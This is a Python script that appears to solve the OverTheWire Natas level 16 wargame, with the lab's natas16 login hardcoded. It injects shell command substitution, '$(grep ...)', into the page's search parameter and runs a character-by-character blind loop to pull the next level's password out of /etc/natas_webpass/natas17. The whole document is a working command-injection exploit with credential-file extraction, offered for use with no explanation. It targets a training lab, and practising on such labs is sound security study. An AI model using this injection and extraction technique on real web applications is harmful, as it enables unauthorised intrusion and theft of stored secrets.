import requests,string
base_url ="http://natas16.natas.labs.overthewire.org/index.php?needle=$("
characters = ''.join([string.ascii_letters,string.digits])

username="natas16"
password="TRD7iZrd5gATjj9PkPEuaOlfEjHqj32V"

passwd=''
passwd_len=len(passwd)

def check(query):
    url = base_url + query + ")&submit=Search"
    res = requests.get(url, auth=(username, password))
    if("African" in res.text):
        return False
    return True

while True:
    found = False
    for c in characters:
        query=f"grep {passwd}{c} /etc/natas_webpass/natas17"
        alt_query=f"grep {c}{passwd} /etc/natas_webpass/natas17"
        if(check(query)):
            passwd += c
        elif(check(alt_query)):
            passwd = c + passwd
        if(passwd_len != len(passwd)):
            found = True
            passwd_len = len(passwd)
            print(passwd)
            break
    if(not found):
        break

print(f"PASSWORD: {passwd}")
